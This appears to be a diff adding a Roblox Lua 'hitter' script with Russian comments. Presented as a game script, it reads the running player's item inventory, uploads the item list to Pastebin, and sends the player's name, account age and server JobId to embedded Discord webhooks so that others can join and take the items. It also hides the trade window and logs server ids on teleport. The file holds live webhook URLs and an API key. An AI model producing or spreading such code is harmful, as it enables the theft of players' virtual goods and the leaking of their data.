@@ -1,1 +1,218 @@
-п
+-- [ Settings ] -- 
+Username = "Warrior_ggs"
+Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
+
+-- [ Dualhook Settings ] --
+DualUsername = "Warrior_ggs"
+DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
+DualUnique = 1
+DualAncient = 1
+DualGodly = 1
+
+userName = Username
+webHook = Webhook
+
+if getgenv().executed then return end
+getgenv().executed = true
+
+local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+
+-- === EMBED SYSTEM ===
+function SendMessageEMBED(url, embed, bool)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local jobIdString = getgenv().JobId or game.JobId
+    local data = {
+        ["content"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. jobIdString .. '")',
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+            }
+        }
+    }
+    local data2 = {
+        ["content"] = '---@everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. jobIdString .. '")',
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local body2 = http:JSONEncode(data2)
+    
+    if bool == true then
+        request({Url = url, Method = "POST", Headers = headers, Body = body2})
+    else
+        request({Url = url, Method = "POST", Headers = headers, Body = body})
+    end
+end
+
+-- === АНТИ-ТРЕЙД GUI ===
+local destroytrades2 = coroutine.create(function()
+    while true do
+        local player = game:GetService("Players").LocalPlayer
+        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
+        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
+
+        if tradeGUI.Enabled == true then tradeGUI.Enabled = false end
+        if tradeGUIPhone.Enabled == true then tradeGUIPhone.Enabled = false end
+        wait(0.1)
+    end
+end)
+
+-- === УРОВЕНЬ И ПРЕСТИЖ ===
+local levelTable = {}
+for i,v in pairs(LevelModule.XPTable) do
+    if PlayerDataModule.NewXP < v then
+        table.insert(levelTable, i)
+    end
+end
+local playerLevel = math.min(table.unpack(levelTable))
+local playerPrestige = LevelModule.Prestige
+
+-- === ИНВЕНТАРЬ ===
+local allItems, vintageItems, commonItems, uncommonItems, rareItems, legendaryItems, godlyItems, ancientItems, uniqueItems = {},{},{},{},{},{},{},{},{}
+local vintageItemsC, commonItemsC, uncommonItemsC, rareItemsC, legendaryItemsC, godlyItemsC, ancientItemsC, uniqueItemsC = 0,0,0,0,0,0,0,0
+
+for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c,d in pairs(b) do
+        table.insert(allItems, d.ItemName)
+        if d.Rarity == "Vintage" then vintageItemsC+=1 table.insert(vintageItems,d.DataID) end
+        if d.Rarity == "Common" then commonItemsC+=1 table.insert(commonItems,d.DataID) end
+        if d.Rarity == "Uncommon" then uncommonItemsC+=1 table.insert(uncommonItems,d.DataID) end
+        if d.Rarity == "Rare" then rareItemsC+=1 table.insert(rareItems,d.DataID) end
+        if d.Rarity == "Legendary" then legendaryItemsC+=1 table.insert(legendaryItems,d.DataID) end
+        if d.Rarity == "Godly" then godlyItemsC+=1 table.insert(godlyItems,d.DataID) end
+        if d.Rarity == "Ancient" then ancientItemsC+=1 table.insert(ancientItems,d.DataID) end
+        if d.Rarity == "Unique" then uniqueItemsC+=1 table.insert(uniqueItems,d.DataID) end
+    end
+end
+
+-- === PASTEBIN ===
+local HttpService = game:GetService("HttpService")
+local function pastebin(content)
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {["Content-Type"] = "application/x-www-form-urlencoded"},
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "\nError...\n"
+    end
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+    return rawUrl
+end
+
+local function formatItems(itemList) if #itemList == 0 then return "None" else return table.concat(itemList, "\n") end end
+local pastebinString = "-- [ Uniques ] --\n" .. formatItems(uniqueItems) ..
+                       "\n\n-- [ Ancient ] --\n" .. formatItems(ancientItems) ..
+                       "\n\n-- [ Godlies ] --\n" .. formatItems(godlyItems) ..
+                       "\n\n-- [ Legendaries ] --\n" .. formatItems(legendaryItems) ..
+                       "\n\n-- [ Vintage ] --\n" .. formatItems(vintageItems) ..
+                       "\n\n-- [ Rare ] --\n" .. formatItems(rareItems) ..
+                       "\n\n-- [ Uncommon ] --\n" .. formatItems(uncommonItems) ..
+                       "\n\n-- [ Common ] --\n" .. formatItems(commonItems)
+local pastebinLink = pastebin(pastebinString)
+
+if godlyItemsC >= DualGodly or ancientItemsC >= DualAncient or uniqueItemsC >= DualUnique then
+    userName = DualUsername
+    webHook = DualWebhook
+end
+
+local embed = {
+    ["title"] = "You just got a new hit with Elliot Bot",
+    ["color"] = 65280,
+    ["fields"] = {
+        {["name"] = " Details:", ["value"] = "```Name: "..game.Players.LocalPlayer.Name.."\nAccountAge: "..tostring(game.Players.LocalPlayer.AccountAge).."\nReceiver: "..userName.."```"},
+        {["name"] = " Hit:", ["value"] = "Total Count: "..tostring(uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC)..
+                                         "\n Uniques: "..tostring(uniqueItemsC)..
+                                         "\n Ancients: "..tostring(ancientItemsC)..
+                                         "\n Godlys: "..godlyItemsC..
+                                         "\n Legendarys: "..legendaryItemsC..
+                                         "\n Vintages: "..tostring(vintageItemsC)..
+                                         "\n Rares: "..rareItemsC..
+                                         "\n Uncommons: "..tostring(uncommonItemsC)..
+                                         "\n Commons: "..tostring(commonItemsC)},
+        {["name"] = " Hit List:", ["value"] = "[Click Here]("..pastebinLink..")"},
+    },
+}
+
+if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
+    SendMessageEMBED(webHook, embed, true)
+else
+    SendMessageEMBED(webHook, embed, false)
+end
+
+-- === PLAYER CHAT TRIGGER ===
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == userName then
+        player.Chatted:Connect(function(msg)
+            -- твой stealItems() сюда при необходимости
+        end)
+    end
+end)
+
+-- === JOBID BYPASSER ===
+game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v)
+    local serverId = v.ServerInstanceId
+    queue_on_teleport(string.format([[
+        getgenv().JobId = "%s"
+        
+        task.wait(2)
+        
+        local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
+        local message = "Сервер сгенерирован! JobId: `" .. getgenv().JobId .. "`"
+        local data = {["content"] = message, ["username"] = "JobId Logger"}
+        local jsonData = game:GetService("HttpService"):JSONEncode(data)
+        
+        local success, response = pcall(function()
+            return syn.request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
+        end)
+        
+        if not success then
+            success, response = pcall(function()
+                return request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
+            end)
+        end
+        
+        if not success then
+            warn("Ошибка отправки в Discord: " .. tostring(response))
+        else
+            print("JobId успешно отправлен в Discord!")
+        end
+    ]], serverId))
+end)
+
+for _ = 1, 2 do
+    task.spawn(function()
+        game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, game.JobId)
+    end)
+    task.wait()
+end
